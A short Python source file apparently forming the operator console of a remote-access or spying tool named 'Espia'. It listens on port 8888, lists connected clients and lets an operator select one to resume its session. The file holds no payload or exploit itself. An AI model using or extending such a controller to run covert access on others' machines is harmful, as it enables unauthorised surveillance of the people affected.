from multiprocessing.sharedctypes import Value
from EspiaServer import EspiaServer
from EspiaServer import EspiaErrors
import threading

class EspiaController(threading.Thread):
    def __init__(self, server_port):
        self.server_port = server_port
        self.condition = threading.Condition()
        threading.Thread.__init__(self)
    
    def run(self):
        self.start_listening()
        self.start_controller()
        return

    def start_listening(self):
        self.server_thread = EspiaServer(self.condition, server_port=self.server_port)
        self.server_thread.start()
    
    def start_controller(self):
        while True:
            input_text = input(">> ")
            parameters = input_text.split(" ")
            command = parameters[0]
            parameters = parameters[1:]

            if (command == "list"):
                self.server_thread.list_clients()
            elif (command == "select"):
                self.cmd_select(parameters)
            elif (command == "exit"):
                self.server_thread.shutdown()
                return
    
    def cmd_select(self, parameters):
        if (len(parameters) == 0):
            self.server_thread.list_clients()
        else:
            try:
                index = int(parameters[0])
            except ValueError:
                print("[!] Invalid index")
                return
                    
            try:
                self.server_thread.resume_client(index)
            except IndexError:
                print("[!] Invalid index")
                return
            except EspiaErrors.NoClientsConnected:
                print("[!] No clients connected")
                return

            with self.condition:
                self.condition.wait()

controller = EspiaController(8888)
controller.start()